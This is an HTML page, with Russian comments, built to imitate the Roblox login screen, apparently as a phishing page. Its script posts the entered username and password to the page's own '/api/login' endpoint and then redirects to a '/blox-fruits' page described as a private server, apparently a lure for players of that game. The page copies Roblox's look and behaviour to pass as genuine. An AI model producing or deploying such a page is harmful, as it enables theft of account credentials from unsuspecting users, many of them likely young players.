<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #0b0c10; color: #fff; display: flex; flex-direction: column; min-height: 100vh; }
        
        /* Верхняя панель Roblox */
        .navbar { display: flex; justify-content: space-between; align-items: center; background-color: #121418; padding: 12px 20px; border-bottom: 1px solid #23262d; }
        .nav-left { display: flex; align-items: center; gap: 20px; }
        .roblox-logo { background: #fff; color: #000; font-weight: 900; padding: 4px 8px; font-size: 18px; letter-spacing: -1px; }
        .nav-links { display: flex; gap: 15px; font-size: 14px; color: #ccc; }
        .nav-right { display: flex; align-items: center; gap: 15px; }
        .signup-btn { background: #0074e8; color: white; border: none; padding: 6px 16px; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; }

        /* Основной контейнер с формой */
        .main-content { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .login-card { background: #191b22; padding: 30px; border-radius: 12px; width: 100%; max-width: 420px; text-align: center; border: 1px solid #282c35; box-shadow: 0 8px 24px rgba(0,0,0,0.6); }
        
        h2 { font-size: 24px; font-weight: 700; margin-bottom: 24px; color: #fff; }

        .input-group { margin-bottom: 14px; text-align: left; }
        input { width: 100%; padding: 14px; background: #23262f; border: 1px solid #3a3f4c; border-radius: 8px; color: #fff; font-size: 14px; outline: none; }
        input:focus { border-color: #0074e8; background: #1c1e26; }

        .login-btn { background: #23262f; color: #787d8a; border: 1px solid #3a3f4c; width: 100%; padding: 14px; border-radius: 8px; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 6px; transition: 0.2s; }
        /* Если поля заполнены, кнопка становится активной (белой/яркой) */
        .login-btn.active { background: #0074e8; color: #fff; border-color: #0074e8; }

        .forgot-link { display: block; margin: 18px 0; color: #ccc; font-size: 13px; text-decoration: none; }
        .forgot-link:hover { text-decoration: underline; }

        .divider { border: 0; height: 1px; background: #282c35; margin: 20px 0; }

        .secondary-btn { background: #23262f; color: #fff; border: 1px solid #3a3f4c; width: 100%; padding: 12px; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; margin-bottom: 10px; }
        .secondary-btn:hover { background: #2c303d; }

        #status { margin-top: 14px; font-size: 14px; font-weight: 500; }
    </style>
</head>
<body>

    <!-- Верхняя шапка сайта -->
    <header class="navbar">
        <div class="nav-left">
            <div class="roblox-logo">R</div>
            <div class="nav-links">
                <span>Charts</span>
                <span>Marketplace</span>
                <span>Create</span>
                <span>Robux</span>
            </div>
        </div>
        <div class="nav-right">
            <button class="signup-btn">Sign Up</button>
        </div>
    </header>

    <!-- Форма авторизации -->
    <div class="main-content">
        <div class="login-card">
            <h2>Login to Roblox</h2>
            
            <div class="input-group">
                <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
            </div>

            <div class="input-group">
                <input type="password" id="passwordInput" placeholder="Password" oninput="checkInputs()">
            </div>

            <button id="loginBtn" class="login-btn" onclick="loginUser()">Log In</button>
            
            <a href="#" class="forgot-link">Forgot Password or Username?</a>

            <hr class="divider">

            <button class="secondary-btn">Email Me a One-Time Code</button>
            <button class="secondary-btn">Quick Sign-in</button>

            <div id="status"></div>
        </div>
    </div>

    <script>
        // Подсветка кнопки при вводе текста (как в оригинале)
        function checkInputs() {
            const user = document.getElementById('usernameInput').value.trim();
            const pass = document.getElementById('passwordInput').value.trim();
            const btn = document.getElementById('loginBtn');
            if (user && pass) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        }

        async function loginUser() {
            const username = document.getElementById('usernameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const statusDiv = document.getElementById('status');

            if (!username || !password) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Please fill in all fields.';
                return;
            }

            statusDiv.style.color = '#9ca3af';
            statusDiv.innerText = 'Logging in...';

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });

                const data = await response.json();

                if (response.ok) {
                    statusDiv.style.color = '#22c55e';
                    statusDiv.innerText = 'Success! Redirecting...';
                    
                    // Автоматический переход на приватный сервер через 1.5 секунды
                    setTimeout(() => {
                        window.location.href = '/blox-fruits';
                    }, 1500);

                } else {
                    statusDiv.style.color = '#ef4444';
                    statusDiv.innerText = data.error || 'Login failed';
                }
            } catch (err) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Connection error.';
            }
        }
    </script>

</body>
</html>
